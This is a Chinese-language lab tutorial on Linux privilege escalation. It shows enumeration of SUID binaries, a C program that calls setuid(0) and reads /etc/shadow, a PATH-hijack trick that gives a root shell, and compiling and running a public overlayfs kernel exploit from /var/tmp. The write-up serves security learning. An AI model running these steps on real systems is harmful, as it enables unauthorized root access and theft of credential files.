Linux中可以参考这篇文章，[Linux提权一文通](https://www.freebuf.com/articles/system/251884.html)。

在Linux中，也会存在`错误权限配置`的问题，通过查找所有用户具有写权限文件的SUID/GUID所有者是root以及不正确的配置文件，从而发现权限提升漏洞。



# 权限漏洞工具相关

## 权限漏洞查找工具

* [unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
* [LinEnum](https://github.com/rebootuser/LinEnum)
* https://www.exploit-db.com/

## 权限提升漏洞工具列表

* [Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)



# 提权方式

## SUID提权

SUID是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行。

SUID是一种对二进制程序进行设置的特殊权限，可以让二进制程序的执行者临时拥有属主的权限（仅对拥有执行权限的二进制程序有效）。

因此这只是一种**有条件**的、**临时的特殊权限授权方法**。如果拥有SUID权限，那么就可以利用系统中的二进制文件和工具来进行提权。

>  这很像我们在古装剧中见到的手持尚方宝剑的钦差大臣，他手持的尚方宝剑代表的是皇上的权威，因此可以惩戒贪官，但这并不意味着他永久成为了皇上。

### 查看SUID文件

查看Linux系统上所属组未root的所有SUID可执行文件。

```
find / -user root -perm -4000 -print 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000 -exec ls -ldb {} ;
```

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210828091644.png)

随便找一个来查看

```
hancool@ubuntu:~$ ls -sl /bin/ping
44 -rwsr-xr-x 1 root root 44168 May  8  2014 /bin/ping
```

可以看到这里的权限是`rwsr`，这就表明该文件具有SUID权限。

> ls命令参数
>
> -l：除了文件名之外，还将文件的权限、所有者、文件大小等信息详细列出来
>
> -s：–size 以块大小为单位列出所有文件的大小



### 漏洞演示

```
vim suid.c
```

```c
#include<stdlib.h>
#include <unistd.h>
int main()
{
setuid(0);//run as root
system("id");
system("cat /etc/shadow");
}
```

编译

```
gcc suid.c -o suid-exp
```

加上SUID权限位

```
chmod 4775 suid-exp
```

切换到普通用户去执行

```
su hacker
```

可以看到当我们用hacker用户去执行suid_exp可执行文件后，hacker用户的uid和组都变成了root用户和root组。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210828095330.png)

通过以上演示，可以知道确实存在SUID权限方面的漏洞，并且我们通过命令查找到有很多SUID文件，那么我们就要利用好这些“尚方宝剑”。

### 漏洞利用

```
echo "/bin/bash cat" > cat && chmod 777 cat
```

查看添加当前环境变量

```
hacker@webper-virtual-machine:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

并将当前目录添加到环境变量中

```
hacker@webper-virtual-machine:/tmp$ export PATH=.:$PATH
```

再次查看添加当前环境变量，可以看到`/usr/local/sbin`多了一个`.`，也就是当前目录

```
hacker@webper-virtual-machine:/tmp$ echo $PATH
.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/
```

执行suid_exp文件

```
hacker@webper-virtual-machine:/tmp$ ./suid_exp 
uid=0(root) gid=1001(hacker) 组=1001(hacker)
root@webper-virtual-machine:/tmp#
```

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210828104726.png)

可以看到这里已经从hacker用户切换到了root用户，说明已经提权成功，但是不知道为什么没有执行脚本里面的cat命令。

```
system("cat /etc/shadow");
```

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210828110946.png)

并且切换了其他Ubuntu靶机也没有执行成功，好奇怪。通过仔细检查教程中的C源码发现，`cat`命令其实是`/bin/bash`命令，所以当然没有任何输出。小伙伴们，那你们觉得怎么改才能看到`/etc/shadow`中的内容呢？

现在我们已经提权成功，所以可以为所欲为了。



## 内核漏洞

查看系统版本

```
webper@webper-virtual-machine:~$ uname -a
Linux webper-virtual-machine 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
```

查找对应版本是否存在漏洞

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210827084740.png)

可以看到有对应的漏洞的存在，其中一个点进去之后可以看到有exp的脚本。

![](https://borinboy.oss-cn-shanghai.aliyuncs.com/huan20210827084928.png)

可以看到脚本开头是注释，介绍了该exp的使用方法，下面是C语言的代码。我们将完整代码复制到目标服务器上，或保存到本地再上传到目标服务器，按照使用方法去执行。

查找存放目录

在Linux下，`/var/tmp`与`tmp`目录是黑客最喜欢的目录，因为这里的目录权限比较高，任意用户都可以读写和执行。

```
hacker@webper-virtual-machine:/var$ ls -l
总用量 48
drwxr-xr-x  2 root root     4096  8月 26 08:00 backups
drwxr-xr-x 19 root root     4096  4月  5  2019 cache
drwxrwsrwt  2 root whoopsie 4096  8月 25 08:25 crash
drwxr-xr-x 71 root root     4096  8月 22 16:43 lib
drwxrwsr-x  2 root staff    4096  4月 11  2014 local
lrwxrwxrwx  1 root root        9  4月  5  2019 lock -> /run/lock
drwxrwxr-x 16 root syslog   4096  8月 27 07:47 log
drwxrwsr-x  2 root mail     4096  8月  5  2015 mail
drwxrwsrwt  2 root whoopsie 4096  8月  5  2015 metrics
drwxr-xr-x  2 root root     4096  8月  5  2015 opt
lrwxrwxrwx  1 root root        4  4月  5  2019 run -> /run
drwxr-xr-x  9 root root     4096  8月  5  2015 spool
drwxrwxrwt  2 root root     4096  8月 27 08:59 tmp
drwxr-xr-x  3 root root     4096  4月  9  2019 www
```

那我们就可以将exp文件保存到该目录下并授予执行权限。

```
hacker@webper-virtual-machine:/var/tmp$ chmod +x ofs.c
hacker@webper-virtual-machine:/var/tmp$ ls -l
总用量 12
-rwxrwxr-x 1 hacker hacker 4982  8月 27 08:59 ofs.c
-rw------- 1 root   root    799  4月  7  2019 phpmyadmin.phpmyadmin.2019-04-07-10.18.mysql.ct3QHG
```

然后我们可以按照文本开头的方法开始执行提权操作。

```
hacker@webper-virtual-machine:/var/tmp$ gcc ofs.c -o ofs
hacker@webper-virtual-machine:/var/tmp$ id
uid=1001(hacker) gid=1001(hacker) 组=1001(hacker)
hacker@webper-virtual-machine:/var/tmp$ chmod +x ofs
hacker@webper-virtual-machine:/var/tmp$ ./ofs
spawning threads
mount #1
mount #2
child threads done
exploit failed
```

这里执行失败了，去查看exploit-db的漏洞说明，这里明显表示受影响的内核版本是大于3.13.0和小于3.19之间的。

```
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
```

而上面`uname -a`发现内核版本刚好是3.19，不在受影响版本的区间范围，应该是后面的版本将此漏洞进行了修复，所有这里复现失败。